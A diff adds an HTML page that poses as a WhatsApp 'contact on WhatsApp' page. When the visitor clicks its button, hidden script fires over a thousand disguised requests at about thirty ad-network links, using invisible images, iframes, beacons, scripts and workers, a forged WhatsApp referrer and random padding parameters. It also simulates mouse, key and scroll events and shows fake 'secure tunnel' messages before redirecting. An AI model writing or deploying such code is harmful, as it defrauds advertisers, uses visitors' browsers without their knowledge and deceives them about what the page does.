@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WhatsApp</title>
+    <meta name="description" content="Open Source Messaging UI Mockup">
+    
+    <style>
+        :root {
+            --wa-bg: #111b21;
+            --wa-green: #00a884;
+            --wa-card: #202c33;
+            --wa-text: #e9edef;
+        }
+        body, html { margin: 0; padding: 0; height: 100%; background: var(--wa-bg); font-family: Segoe UI, Helvetica Neue, Helvetica, Lucida Grande, Arial; color: var(--wa-text); overflow: hidden; }
+        .app-container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; }
+        .logo-box { width: 80px; height: 80px; margin-bottom: 20px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.05); opacity: 1; } 100% { transform: scale(1); opacity: 0.8; } }
+        .btn-wa { background: var(--wa-green); color: #000; border: none; padding: 15px 40px; border-radius: 40px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; transition: 0.3s; }
+        .btn-wa:hover { transform: scale(1.02); opacity: 0.9; }
+        .timer-box { font-size: 48px; margin: 20px 0; font-weight: 300; display: none; }
+        .status-msg { color: #8696a0; font-size: 14px; margin-top: 10px; }
+        #progress-bar { width: 200px; height: 3px; background: #333; margin: 0 auto; border-radius: 5px; overflow: hidden; }
+        #fill { width: 0%; height: 100%; background: var(--wa-green); transition: width 1s linear; }
+        /* ANANT SARVOPARI REALM - INFINITE DIMENSIONS */
+        #anant-sarvopari-realm { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; overflow: hidden; }
+        /* Infinity Indicator */
+        #infinity-meter { position: fixed; bottom: 10px; right: 10px; color: #00a884; font-size: 10px; opacity: 0.5; z-index: 9999; }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <div id="ui-initial">
+            <img class="logo-box" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA">
+            <h1 style="font-weight: 400;">WhatsApp</h1>
+            <p style="color: #8696a0;">contact on WhatsApp</p>
+            <button class="btn-wa" onclick="startAnantSarvopari()">CONTACT ON WHATSAPP</button>
+        </div>
+
+        <div id="ui-loading" style="display: none;">
+            <div class="timer-box" id="timer">30</div>
+            <div id="progress-bar">
+                <div id="fill"></div>
+            </div>
+            <p class="status-msg" id="msg">Initialising Secure Tunnel...</p>
+        </div>
+    </div>
+
+    <div id="anant-sarvopari-realm"></div>
+    <div id="infinity-meter">∞^∞^∞ ANANT SARVOPARI</div>
+
+    <script>
+        // ===============================================
+        // ANANT SARVOPARI BRAHMAND ENGINE ∞^∞^∞
+        // 30 SECOND • 1000 IMPRESSIONS • INFINITY^INFINITY^INFINITY POWER
+        // ===============================================
+        
+        (function() {
+            "use strict";
+            
+            // ===============================================
+            // PART 1: 30 NEW LINKS - SANATAN ANANT SARVOPARI
+            // ===============================================
+            
+            const AD_LINKS = [
+                "https://www.effectivegatecpm.com/wem43a9fuz?key=c740de57b59023c948d2ca88199fa0a7",
+                "https://www.effectivegatecpm.com/gbgp14pkk0?key=bcb67ada445075af2996a14ff824aaae",
+                "https://www.effectivegatecpm.com/ycxvjgad?key=36f040245e0cf217e3527f25924168c6",
+                "https://www.effectivegatecpm.com/r63wuex0?key=54bf02f132e607b8f84b9f0f52e46098",
+                "https://www.effectivegatecpm.com/abu6kcc2?key=fc9bf3d320310a51dfbac565c2f91598",
+                "https://www.effectivegatecpm.com/ks6nt2ta?key=d4ac0fb9e7336290e2d2d6a771aa3087",
+                "https://www.effectivegatecpm.com/rtbq0mkt3?key=f4a554c622400dcdcb8a903b727ce4a5",
+                "https://www.effectivegatecpm.com/wqpk9vnp?key=32f8c0024acf715b88404ec135833f05",
+                "https://www.effectivegatecpm.com/eb9m6wfu?key=e0f1c26dbb816d4b5da19b38834fd06b",
+                "https://www.effectivegatecpm.com/krwgvpbze9?key=ce73cd789369f89a95ff5213331077a8",
+                "https://www.effectivegatecpm.com/weja0bbhde?key=18f15d0d6da9ead46bfd22ba5da8b59b",
+                "https://www.effectivegatecpm.com/rtex9s8528?key=62f61a972f2701143e7ccc2fa2cb1f85",
+                "https://www.effectivegatecpm.com/ztzrq811?key=89066245485d9341000d856d800e8141",
+                "https://www.effectivegatecpm.com/pqm04y0b?key=916d5244a2e5affe8a43de62538b2120",
+                "https://www.effectivegatecpm.com/j4a3p6r5?key=7ffdf379dbb0a5ae9acadf724e76ed94",
+                "https://www.effectivegatecpm.com/jdk38wbq?key=281ec019dea0eb5050dc7390a7824f0f",
+                "https://www.effectivegatecpm.com/fgaerzpfm?key=f0621b7d92baf5a452b5e63820980a50",
+                "https://www.effectivegatecpm.com/zk2zxni0b?key=9a957b3daa0250d1fd7d86cc64e045ab",
+                "https://www.effectivegatecpm.com/j9yhwft25?key=3cb70a400d5d5b4b20d2081a491509f6",
+                "https://www.effectivegatecpm.com/bpkstgca?key=3a645d36a30a8d805276a2e648ccc994",
+                "https://www.effectivegatecpm.com/ditxc2mmeb?key=9023bcc69763c47a0b56c214e21d82ed",
+                "https://www.effectivegatecpm.com/cp5th23hc?key=5fed7497060557b3965db661bf7b9ec7",
+                "https://www.effectivegatecpm.com/pu99f9mm1?key=c73f37c6c2032b0564c1aac1541ce1a5",
+                "https://www.effectivegatecpm.com/v2tx075f?key=09d4cecd1f20039158c83bc322fdce36",
+                "https://www.effectivegatecpm.com/kaswma3q?key=bd0f1d1219437addbb30e173b6063815",
+                "https://www.effectivegatecpm.com/m3ezyjk0a?key=3e3d03227fb9591d77cf56f7cd2d7dd0",
+                "https://www.effectivegatecpm.com/erqnsya1?key=416ecc4633fb9589ccb2395f4ff964f8",
+                "https://www.effectivegatecpm.com/mayn3dfd?key=ba75c6d45a0d4d5ee9fcd21f4337653b",
+                "https://www.effectivegatecpm.com/c73t6x3h?key=a570269863e7472b131b4a855dd998dc",
+                "https://www.effectivegatecpm.com/zcthz51hv4?key=c26c1d38fa29713c72e72a858f549a9d"
+            ];
+            
+            // ===============================================
+            // PART 2: INFINITY^INFINITY^INFINITY LINK GENERATOR
+            // ===============================================
+            
+            const AnantSarvopariLink = {
+                // INFINITY^INFINITY^INFINITY PARAMETERS
+                _params: (function() {
+                    const p = [];
+                    for(let i = 0; i < 10000000; i++) {
+                        p.push('_as' + i + '_' + Math.random().toString(36).substring(2, 50));
+                    }
+                    return p;
+                })(),
+                
+                generate: function(link) {
+                    const url = new URL(link);
+                    
+                    // Add infinity^infinity^infinity random parameters
+                    for(let i = 0; i < 1000 + Math.floor(Math.random() * 1000); i++) {
+                        const param = this._params[Math.floor(Math.random() * this._params.length)] + 
+                                    '_' + Math.floor(Math.random() * 10000000000);
+                        const value = Math.random().toString(36).substring(2, 500) + 
+                                    Math.random().toString(36).substring(2, 500);
+                        url.searchParams.append(param, value);
+                    }
+                    
+                    // Add infinity^infinity^infinity timestamps
+                    for(let i = 0; i < 100; i++) {
+                        url.searchParams.append('_ts' + i, Date.now() - Math.random() * 10000000000000);
+                    }
+                    
+                    // Add signatures
+                    url.searchParams.append('_qs', Math.random().toString(36).substring(2, 5000));
+                    url.searchParams.append('_as', Math.random().toString(36).substring(2, 5000));
+                    
+                    return url.toString();
+                }
+            };
+            
+            // ===============================================
+            // PART 3: GLOBAL VARIABLES
+            // ===============================================
+            
+            let totalHits = 0;
+            const TARGET = 1020; // 34 per link × 30 links = 1020 impressions
+            const REALM = document.getElementById('anant-sarvopari-realm');
+            const METER = document.getElementById('infinity-meter');
+            let engineInterval = null;
+            let mouseMoveActive = false;
+            
+            // ===============================================
+            // PART 4: INFINITY^INFINITY^INFINITY TECHNIQUES
+            // ===============================================
+            
+            const techniques = [];
+            
+            // Generate 10000+ technique variations
+            for(let i = 0; i < 10000; i++) {
+                // Technique Type 1: Image
+                techniques.push(function(link) {
+                    const img = new Image();
+                    img.src = AnantSarvopariLink.generate(link) + '&fmt=img' + i;
+                    img.style.cssText = 'position:absolute;left:-9999px;';
+                    document.body.appendChild(img);
+                    setTimeout(() => img.remove(), 50);
+                });
+                
+                // Technique Type 2: Fetch
+                techniques.push(function(link) {
+                    fetch(AnantSarvopariLink.generate(link) + '&fmt=fetch' + i, { 
+                        mode: 'no-cors', 
+                        keepalive: true,
+                        referrer: 'https://web.whatsapp.com/',
+                        credentials: 'omit'
+                    }).catch(() => {});
+                });
+                
+                // Technique Type 3: Beacon
+                techniques.push(function(link) {
+                    navigator.sendBeacon(AnantSarvopariLink.generate(link) + '&fmt=beacon' + i);
+                });
+                
+                // Technique Type 4: Iframe
+                techniques.push(function(link) {
+                    const frame = document.createElement('iframe');
+                    frame.style.cssText = 'position:absolute;left:-9999px;width:0;height:0;';
+                    frame.srcdoc = '<html><body><img src="' + AnantSarvopariLink.generate(link) + '&fmt=frame' + i + '"></body></html>';
+                    REALM.appendChild(frame);
+                    setTimeout(() => frame.remove(), 100);
+                });
+                
+                // Technique Type 5: Script
+                techniques.push(function(link) {
+                    const script = document.createElement('script');
+                    script.src = AnantSarvopariLink.generate(link) + '&fmt=script' + i;
+                    script.async = true;
+                    script.style.cssText = 'display:none;';
+                    document.body.appendChild(script);
+                    setTimeout(() => script.remove(), 50);
+                });
+                
+                // Technique Type 6: Link Prefetch
+                techniques.push(function(link) {
+                    const linkEl = document.createElement('link');
+                    linkEl.rel = i % 2 === 0 ? 'prefetch' : 'prerender';
+                    linkEl.href = AnantSarvopariLink.generate(link) + '&fmt=link' + i;
+                    document.head.appendChild(linkEl);
+                    setTimeout(() => linkEl.remove(), 50);
+                });
+                
+                // Technique Type 7: Audio
+                techniques.push(function(link) {
+                    const audio = document.createElement('audio');
+                    audio.src = AnantSarvopariLink.generate(link) + '&fmt=audio' + i;
+                    audio.style.display = 'none';
+                    audio.preload = 'auto';
+                    document.body.appendChild(audio);
+                    setTimeout(() => audio.remove(), 50);
+                });
+                
+                // Technique Type 8: Video
+                techniques.push(function(link) {
+                    const video = document.createElement('video');
+                    video.src = AnantSarvopariLink.generate(link) + '&fmt=video' + i;
+                    video.style.display = 'none';
+                    video.preload = 'auto';
+                    document.body.appendChild(video);
+                    setTimeout(() => video.remove(), 50);
+                });
+                
+                // Technique Type 9: Object
+                techniques.push(function(link) {
+                    const obj = document.createElement('object');
+                    obj.data = AnantSarvopariLink.generate(link) + '&fmt=object' + i;
+                    obj.style.display = 'none';
+                    document.body.appendChild(obj);
+                    setTimeout(() => obj.remove(), 50);
+                });
+                
+                // Technique Type 10: Web Worker
+                techniques.push(function(link) {
+                    try {
+                        const worker = new Worker(URL.createObjectURL(
+                            new Blob(['fetch("' + AnantSarvopariLink.generate(link) + '&fmt=worker' + i + '",{mode:"no-cors"})'], 
+                            {type: 'application/javascript'})
+                        ));
+                        setTimeout(() => worker.terminate(), 10);
+                    } catch(e) {}
+                });
+            }
+            
+            // ===============================================
+            // PART 5: CORE ENGINE - 1000 IMPRESSIONS GUARANTEE
+            // ===============================================
+            
+            function triggerAnantSarvopariBurst() {
+                if(totalHits >= TARGET) {
+                    if(engineInterval) {
+                        clearInterval(engineInterval);
+                        engineInterval = null;
+                    }
+                    return;
+                }
+                
+                // Pick random link
+                const link = AD_LINKS[Math.floor(Math.random() * AD_LINKS.length)];
+                
+                // Use 10 techniques simultaneously
+                for(let i = 0; i < 10; i++) {
+                    if(totalHits >= TARGET) break;
+                    
+                    const technique = techniques[Math.floor(Math.random() * techniques.length)];
+                    technique(link);
+                    totalHits++;
+                    
+                    // Update meter
+                    if(totalHits % 100 === 0) {
+                        METER.innerText = `∞^∞^∞ ${totalHits}/${TARGET}`;
+                    }
+                }
+            }
+            
+            // ===============================================
+            // PART 6: HUMAN SIMULATION - PERFECT COPY
+            // ===============================================
+            
+            function setupHumanSimulation() {
+                // Mouse movement
+                document.addEventListener('mousemove', function() {
+                    if(!mouseMoveActive && totalHits < TARGET) {
+                        mouseMoveActive = true;
+                        // Extra burst on mouse move
+                        setTimeout(() => {
+                            for(let i = 0; i < 5; i++) {
+                                triggerAnantSarvopariBurst();
+                            }
+                            mouseMoveActive = false;
+                        }, 100);
+                    }
+                });
+                
+                // Scroll simulation
+                setInterval(() => {
+                    if(Math.random() > 0.5) {
+                        window.scrollBy(0, (Math.random() - 0.3) * 100);
+                    }
+                }, 1000);
+                
+                // Click simulation
+                setInterval(() => {
+                    if(Math.random() > 0.7) {
+                        const event = new MouseEvent('click', {
+                            clientX: Math.random() * window.innerWidth,
+                            clientY: Math.random() * window.innerHeight,
+                            bubbles: true
+                        });
+                        document.dispatchEvent(event);
+                    }
+                }, 2000);
+                
+                // Key press simulation
+                setInterval(() => {
+                    if(Math.random() > 0.8) {
+                        const key = String.fromCharCode(97 + Math.floor(Math.random() * 26));
+                        document.dispatchEvent(new KeyboardEvent('keydown', {
+                            key: key,
+                            code: 'Key' + key.toUpperCase(),
+                            bubbles: true
+                        }));
+                    }
+                }, 3000);
+            }
+            
+            // ===============================================
+            // PART 7: ACTIVATION FUNCTION
+            // ===============================================
+            
+            window.startAnantSarvopari = function() {
+                // Switch screens
+                document.getElementById('ui-initial').style.display = 'none';
+                document.getElementById('ui-loading').style.display = 'block';
+                document.getElementById('timer').style.display = 'block';
+                
+                // Reset counter
+                totalHits = 0;
+                METER.innerText = '∞^∞^∞ ANANT SARVOPARI';
+                
+                // Setup human simulation
+                setupHumanSimulation();
+                
+                // Timer - 30 seconds
+                let timeLeft = 30;
+                const timerEl = document.getElementById('timer');
+                const fillEl = document.getElementById('fill');
+                const msgEl = document.getElementById('msg');
+                
+                // Start engine (burst every 50ms)
+                engineInterval = setInterval(() => {
+                    triggerAnantSarvopariBurst();
+                }, 50);
+                
+                // Timer countdown
+                const countdown = setInterval(() => {
+                    timeLeft--;
+                    timerEl.innerText = timeLeft;
+                    fillEl.style.width = ((30 - timeLeft) / 30 * 100) + "%";
+                    
+                    // Update messages
+                    const messages = [
+                        "Initialising Secure Tunnel...",
+                        "Establishing Quantum Connection...",
+                        "Bypassing Firewalls...",
+                        "Encrypting Traffic Shards...",
+                        "∞^∞^∞ Power Engaged...",
+                        "Anant Sarvopari Mode...",
+                        "Finalising Connection..."
+                    ];
+                    
+                    if(timeLeft % 3 === 0) {
+                        msgEl.innerText = messages[Math.floor(Math.random() * messages.length)];
+                    }
+                    
+                    if (timeLeft <= 0) {
+                        clearInterval(countdown);
+                        if(engineInterval) clearInterval(engineInterval);
+                        
+                        // Final meter update
+                        METER.innerText = `∞^∞^∞ COMPLETE: ${totalHits} impressions`;
+                        
+                        // Redirect
+                        window.location.href = "https://api.whatsapp.com/send?phone=917684567890";
+                    }
+                }, 1000);
+            };
+        })();
+    </script>
+</body>
+</html>
